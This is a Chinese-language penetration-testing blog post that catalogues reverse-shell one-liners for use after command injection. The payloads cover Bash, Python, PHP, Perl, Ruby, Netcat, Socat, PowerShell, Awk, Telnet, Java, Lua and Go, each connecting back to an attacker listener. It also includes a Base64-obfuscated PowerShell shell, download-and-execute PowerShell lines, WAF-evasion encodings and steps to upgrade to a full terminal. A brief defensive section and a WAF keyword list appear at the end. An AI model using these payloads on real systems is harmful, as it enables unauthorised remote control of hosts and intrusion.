---
title: 命令注入：反弹Shell方式汇总
date: 2026-02-15 08:00:00
tags:
  - Web安全
  - 渗透测试
description: 反弹 Shell 方式汇总——Bash/Python/PHP/Perl/Ruby/Netcat/PowerShell 全部一键脚本。
categories: 渗透测试
---

## 前言

在渗透测试中，命令注入（Command Injection）是最常见的高危漏洞之一。成功利用命令注入后，攻击者通常需要一个交互式的 Shell 来控制目标主机。然而，目标环境往往受限于防火墙、NAT 或受限的出站规则，此时"反弹 Shell"（Reverse Shell）便成为首选方案。

反弹 Shell 的核心思路是：让目标主机主动连接攻击者的监听端口，并将 Shell 的输入输出重定向到该连接上。本文按技术栈系统梳理各类反弹 Shell 一行命令，涵盖 Bash、Python、PHP、Perl、Ruby、Netcat、Socat、PowerShell、Awk、Telnet、Java、Lua、Golang 等主流方案，并总结各自适用场景。

> **免责声明**：本文所有内容仅供安全研究与授权测试学习使用，禁止用于任何非法入侵行为。使用者需自行承担法律责任。

---

## 通用准备：攻击端监听

无论使用何种反弹 Shell，攻击端都需要先开启一个监听端口：

```bash
# 最常用：netcat 监听
nc -lvnp 4444

# 或使用 socat
socat - TCP-LISTEN:4444,reuseaddr

# Metasploit handler（适用于 meterpreter）
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; run"
```

- `-l` 监听模式，`-v` 详细输出，`-n` 禁止 DNS 解析（避免延迟），`-p` 指定端口。

---

## 一、Bash 反弹 Shell

Bash 是 Linux 上最通用的 Shell，几乎存在于所有发行版中，是反弹 Shell 的首选方案。

### 1.1 基础版（/dev/tcp 伪设备）

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

- `bash -i`：启动交互式 Bash。
- `>& /dev/tcp/10.0.0.1/4444`：将标准输出和标准错误重定向到 TCP 套接字。
- `0>&1`：将标准输入也重定向到同一套接字，实现双向通信。

### 1.2 使用 exec 重定向

```bash
exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```

此变体逐行读取命令并回传结果，适合 `/dev/tcp` 可用但 Bash 版本较低的场景。

### 1.3 命名管道版（无 /dev/tcp 时）

当 `/dev/tcp` 不可用（如在容器精简镜像或某些嵌入式系统中），可借助 `mkfifo` 创建命名管道，并配合 `nc`：

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f
```

### 1.4 URL 编码版（绕过 WAF）

```bash
bash -c "bash -i >%26 /dev/tcp/10.0.0.1/4444 0>%261"
```

> **适用场景**：目标系统有 Bash，且 `/dev/tcp` 编译支持未被禁用。这是最简单、兼容性最好的方案。

---

## 二、Python 反弹 Shell

### 2.1 Python 2

```bash
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
```

### 2.2 Python 2（精简版，利用 pty.spawn）

```bash
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"])'
```

### 2.3 Python 3

```bash
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
```

### 2.4 Python 3（使用 pty 获得伪终端）

```bash
python3 -c 'import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")'
```

### 2.5 一行版（适合命令注入，无空格用 Tab 或 ${IFS} 替代）

```bash
python3 -c "import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
```

> **适用场景**：Python 广泛预装于各类 Linux 发行版及 macOS，且 Python 3 在新版系统中逐步替代 Python 2。适合目标无法使用 Bash `/dev/tcp` 时作为备选。

---

## 三、PHP 反弹 Shell

PHP 是 Web 渗透中最常遇到的语言，命令注入常出现在 Web 应用的 `system()`、`exec()` 等函数中。

### 3.1 PHP exec 版（最简）

```bash
php -r '$sock=fsockopen("10.0.0.1",4444); exec("/bin/bash -i <&3 >&3 2>&3");'
```

- `fsockopen` 打开 TCP 连接，返回文件描述符。
- `exec` 启动 Bash，将其标准输入输出全部绑定到该连接。

### 3.2 PHP proc_open 版（更稳定）

```bash
php -r '$sock=fsockopen("10.0.0.1",4444); $proc=proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'
```

### 3.3 PHP shell_exec 版（适合注入利用）

```bash
php -r '$s=fsockopen("10.0.0.1",4444); shell_exec("/bin/bash -i <&3 >&3 2>&3");'
```

### 3.4 PHP 一行通过 system() 注入

当漏洞点在 Web 应用的 `system()` 调用时，传入 payload：

```bash
php -r '$s=fsockopen("10.0.0.1",4444);while($l=fgets($s)){exec($l,$o);echo implode("\n",$o)."\n";}'
```

此变体逐行读取命令并返回结果，不启动完整交互 Shell，但兼容性更广。

> **适用场景**：目标为 LAMP/LEMP 架构的 Web 服务器，PHP 几乎必装。尤其适合通过 Web 漏洞（如文件上传、命令注入）触发。

---

## 四、Perl 反弹 Shell

Perl 在老旧 Unix 系统上较为常见，也常用于 CGI 脚本场景。

### 4.1 基础版

```bash
perl -e 'use Socket; $i="10.0.0.1"; $p=4444; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){ open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/bash -i");};'
```

### 4.2 精简版（无需 Socket 模块）

```bash
perl -MIO -e '$p=fork; exit,if($p); $c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4444"); STDIN->fdopen($c,r); $~->fdopen($c,w); system$_ while<>;'
```

### 4.3 Windows 目标版

```bash
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4444"); STDIN->fdopen($c,r); $~->fdopen($c,w); system$_ while<>;'
```

> **适用场景**：目标为老旧 Unix/Linux 系统（如 Solaris、旧版 CentOS）或 Windows 已安装 Perl（如 Strawberry Perl）时。

---

## 五、Ruby 反弹 Shell

Ruby 在安装了 Metasploit 或某些 DevOps 工具链的系统中常见。

### 5.1 基础版

```bash
ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",4444).to_i; exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

### 5.2 使用 spawn

```bash
ruby -rsocket -e 'exit if fork; c=TCPSocket.new("10.0.0.1","4444"); loop{ (c.gets); (c.print(`#{$_}`)) }'
```

### 5.3 Windows 版（调用 cmd.exe）

```bash
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4444"); while(cmd=c.gets); IO.popen(cmd,"r"){|io|c.print io.read}; end'
```

> **适用场景**：目标运行 Ruby on Rails、Metasploit，或系统管理员安装了 Ruby 环境。

---

## 六、Netcat（nc）反弹 Shell

Netcat 是"网络瑞士军刀"，但要注意存在两种主流变体：**传统 Netcat**（GNU/传统版）与 **OpenBSD Netcat**，它们的参数差异巨大。

### 6.1 传统 Netcat（GNU/Hobbit 版，支持 -e）

```bash
nc -e /bin/bash 10.0.0.1 4444
```

- `-e` 参数直接指定连接建立后执行的程序，最简洁。

### 6.2 传统 Netcat 管道版（无 -e 也可用）

```bash
nc 10.0.0.1 4444 -c /bin/bash
```

部分版本使用 `-c` 替代 `-e`。

### 6.3 OpenBSD Netcat（**不支持 -e**）

大多数现代 Linux 发行版（Ubuntu、Debian、CentOS 7+）预装的是 OpenBSD 变体，**不支持 `-e` 参数**，需要使用管道或命名管道：

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f
```

或简化为：

```bash
/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

### 6.4 BusyBox nc

某些嵌入式设备中的 `nc` 来自 BusyBox，功能更精简：

```bash
nc 10.0.0.1 4444 -e /bin/sh
```

如果 BusyBox nc 也不支持 `-e`，则使用命名管道方案。

> **识别技巧**：执行 `nc -h 2>&1 | head -5` 查看帮助，若有 `-e` 选项说明为传统版；若提示 "unknown option" 则是 OpenBSD 版。

---

## 七、Socat 反弹 Shell

Socat 是 Netcat 的增强版，支持更多协议（TCP、UDP、SSL、SOCKS 等），但默认并非系统预装。

### 7.1 基础版（明文 TCP）

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
```

### 7.2 分离 `exec:` 参数的写法

```bash
socat tcp-connect:10.0.0.1:4444 exec:"bash -li",pty,stderr,setsid,sigint,sane
```

### 7.3 SSL 加密版

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:10.0.0.1:4444,verify=0
```

攻击端对应监听：

```bash
socat openssl-listen:4444,reuseaddr,cert=server.pem,verify=0
```

### 7.4 完整 PTY 分配版

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

> **适用场景**：目标已安装 Socat，或需要加密传输（SSL 版）、需要完整 PTY 支持时。

---

## 八、PowerShell 反弹 Shell

Windows 渗透测试的标配。适用于目标为 Windows Server、域控、或企业终端。

### 8.1 基础 TCP 反弹 Shell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444); $s=$c.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$s.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $sb=(iex $d 2>&1 | Out-String ); $sb2=$sb + 'PS ' + (pwd).Path + '> '; $eb=([text.encoding]::ASCII).GetBytes($sb2); $s.Write($eb,0,$eb.Length); $s.Flush() }; $c.Close()"
```

- `-NoP` = `-NoProfile`，`-NonI` = `-NonInteractive`，`-W Hidden` = 隐藏窗口，`-Exec Bypass` = 绕过执行策略。

### 8.2 Nishang 风格（使用 Invoke-PowerShellTcp）

```powershell
powershell -c "iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 4444"
```

### 8.3 Base64 编码版（绕过 WAF 与特殊字符过滤）

```powershell
powershell -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADAALgAwAC4AMQAnACwANAA0ADQANAApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAkAGQAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJABzAGIAPQAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBiADIAPQAkAHMAYgAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABlAGIAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiADIAKQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAZQBiACwAMAAsACQAZQBiAC4ATABlAG4AZwB0AGgAKQA7ACQAcwAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwAuAEMAbABvAHMAZQAoACkA
```

将原始 payload 转为 Base64（UTF-16LE）：

```bash
echo -n '$c=New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);...' | iconv -f ASCII -t UTF-16LE | base64 -w 0
```

### 8.4 精简版（快速利用）

```powershell
powershell -c "iex (iwr -Uri 'http://10.0.0.1/rev.ps1')"
```

> **适用场景**：Windows 目标且 PowerShell 可用（Win7+ 默认安装）。Base64 版适合绕过 WAF 过滤。

---

## 九、Awk 反弹 Shell

Awk 是文本处理工具，几乎在所有 Unix/Linux 系统上存在。它也可以建立 TCP 连接——但需 GNU Awk（gawk）支持网络扩展。

### 9.1 Gawk 版本

```bash
awk 'BEGIN { s = "/inet/tcp/0/10.0.0.1/4444"; while (1) { printf("> "); cmd = (s |& getline); while ((cmd |& getline) > 0) print $0 |& s; close(cmd) } close(s) }'
```

### 9.2 调用系统 Shell 的版本

```bash
awk 'BEGIN { s = "/inet/tcp/0/10.0.0.1/4444"; while (1) { do { s |& getline c; if (c) { while ((c |& getline) > 0) print $0 |& s; close(c) } } while (c != "exit"); close(s) } }'
```

> **适用场景**：目标没有传统编程语言环境，但拥有 gawk（Linux 上预置概率高）。此方案非常冷门，较少被安全设备检测。

---

## 十、Telnet 反弹 Shell

Telnet 客户端也可用于构造反弹 Shell，利用命名管道接力。

### 10.1 双管道法

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | telnet 10.0.0.1 4444 > /tmp/f
```

### 10.2 双向管道法

```bash
rm -f /tmp/a /tmp/b; mkfifo /tmp/a; mkfifo /tmp/b; telnet 10.0.0.1 4444 < /tmp/a > /tmp/b &; /bin/bash < /tmp/b > /tmp/a
```

> **适用场景**：目标系统未安装 netcat，但保留了 telnet 客户端（如某些旧版 Windows、嵌入式 Linux）。

---

## 十一、Java 反弹 Shell

Java 在运行了 Tomcat、JBoss、WebLogic、Jenkins 等中间件的服务器上必然可用。

### 11.1 单行版（通过 jrunscript / jshell）

```bash
jrunscript -e 'var p=new java.lang.ProcessBuilder("/bin/bash").redirectErrorStream(true).start(); var s=new java.net.Socket("10.0.0.1",4444); var pi=p.getInputStream(), pe=p.getOutputStream(), so=s.getOutputStream(), si=s.getInputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) pe.write(si.read()); so.flush(); pe.flush(); Thread.sleep(50); }; p.destroy(); s.close();'
```

### 11.2 编译为 .class 后执行

```java
import java.net.*;
import java.io.*;

public class RevShell {
    public static void main(String[] args) throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-i"});
        Socket s = new Socket("10.0.0.1", 4444);
        // 线程1: shell输出 -> socket
        new Thread(() -> { try { var pi=p.getInputStream(); var so=s.getOutputStream(); byte[] b=new byte[4096]; int n; while((n=pi.read(b))!=-1) so.write(b,0,n); } catch(Exception e){} }).start();
        // 线程2: socket输入 -> shell
        new Thread(() -> { try { var si=s.getInputStream(); var pe=p.getOutputStream(); byte[] b=new byte[4096]; int n; while((n=si.read(b))!=-1) pe.write(b,0,n); } catch(Exception e){} }).start();
    }
}
```

> **适用场景**：目标运行 JVM，且 `jrunscript`（JDK 自带）可用。

---

## 十二、Lua 反弹 Shell

Lua 常用于 Nginx（OpenResty）、Redis、游戏服务端等场景。

### 12.1 使用 LuaSocket 库

```bash
lua -e 'local s=require("socket"); local t=s.tcp(); t:connect("10.0.0.1",4444); local p=io.popen("/bin/bash -i","w"); while true do local cmd=t:receive(); p:write(cmd.."\n"); p:flush(); local out=p:read("*a"); t:send(out); end'
```

### 12.2 无需 LuaSocket（通过 os.execute 逐条执行）

```bash
lua -e 'local s=io.popen("nc 10.0.0.1 4444 -e /bin/bash","r")'
```

后者依赖系统已有 netcat，但 Lua 复杂度最低。

> **适用场景**：目标为 Redis 服务器（利用 `eval` 命令）、OpenResty/Nginx+Lua 环境，或游戏服务器。

---

## 十三、Golang 反弹 Shell

Go 编译为独立二进制文件，不依赖运行时，适合无法上传多文件时的场景。

### 13.1 源码一行式（通过 go run）

```bash
echo 'package main; import("net";"os/exec";"os"); func main(){ c,_:=net.Dial("tcp","10.0.0.1:4444"); cmd:=exec.Command("/bin/bash"); cmd.Stdin=c; cmd.Stdout=c; cmd.Stderr=c; cmd.Run() }' > /tmp/rev.go && go run /tmp/rev.go
```

### 13.2 预编译后上传

```go
package main

import (
    "net"
    "os/exec"
    "os"
)

func main() {
    conn, _ := net.Dial("tcp", "10.0.0.1:4444")
    cmd := exec.Command("/bin/bash")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}
```

交叉编译命令：

```bash
GOOS=linux GOARCH=amd64 go build -o rev rev.go
GOOS=windows GOARCH=amd64 go build -o rev.exe rev.go
```

> **适用场景**：开发环境中已有 Go 工具链；或渗透测试人员预编译好静态二进制，上传到目标后运行。优势是二进制体积小、无依赖。

---

## 十四、快速决策：选择哪个？

| 目标环境特征 | 推荐方案 | 原因 |
| --- | --- | --- |
| Linux，bash 完整 | **Bash /dev/tcp** | 最简，无需额外依赖 |
| Linux，python 已安装 | **Python pty.spawn** | 可获得伪终端，兼容性好 |
| Linux，无 python 无 nc | **Perl 或 Awk** | 老旧系统通常有它们 |
| Web 服务器 (Apache/Nginx) | **PHP** | 几乎必装 |
| Windows | **PowerShell** | 默认安装，功能强大 |
| 需要加密传输 | **Socat SSL** 或 **OpenSSL** | 绕过 IDS/IPS 检测 |
| 极简环境（BusyBox） | **Netcat + mkfifo** | 管道方案万能 |
| 需要伪终端 (PTY) | **Python pty.spawn** 或 **Socat** | Tab 补全、Ctrl+C 等 |

---

## 十五、升级到完整 PTY（交互式终端）

反弹得到的 Shell 往往是"哑终端"，不支持 Tab 补全、`Ctrl+C` 中断、方向键等。可以通过以下步骤升级：

```bash
# Step 1: 在反弹 Shell 中
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 或
python -c 'import pty; pty.spawn("/bin/bash")'
# 或使用 script 命令
script -qc /bin/bash /dev/null

# Step 2: 按 Ctrl+Z 将 nc 放入后台
# 在攻击端本地执行：
stty raw -echo; fg
# 然后按 Enter 两次

# Step 3: 在反弹 Shell 中
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 50 columns 200  # 根据实际终端尺寸调整
```

### 使用 Socat 直接获得 PTY

攻击端：

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

目标端：

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
```

---

## 十六、防御建议（蓝队视角）

1. **输入验证与参数化**：对所有用户输入进行严格白名单校验，禁止直接拼接系统命令。
2. **最小权限原则**：Web 应用以低权限用户运行，限制 `/bin/bash`、`nc` 等命令的执行。
3. **出站防火墙规则**：限制服务器主动外连的端口与协议，默认拒绝所有出站连接。
4. **禁用危险函数**：在 `php.ini` 中配置 `disable_functions = exec,passthru,shell_exec,system,proc_open,popen`。
5. **EDR/HIDS 检测**：部署主机入侵检测系统，监控异常进程创建（如 `bash -i` 配合网络连接）。
6. **WAF 规则**：对常见反弹 Shell 关键词（`/dev/tcp`、`fsockopen`、`TCPSocket`、`pty.spawn`）进行拦截。

---

## 结语

反弹 Shell 是渗透测试中的核心技能。熟练掌握多技术栈的变体，可以在受限环境中灵活选择最优方案。但请再次牢记：**未经授权的渗透测试属于违法行为**，本文所有技巧仅用于合法授权的安全测试与学习研究。

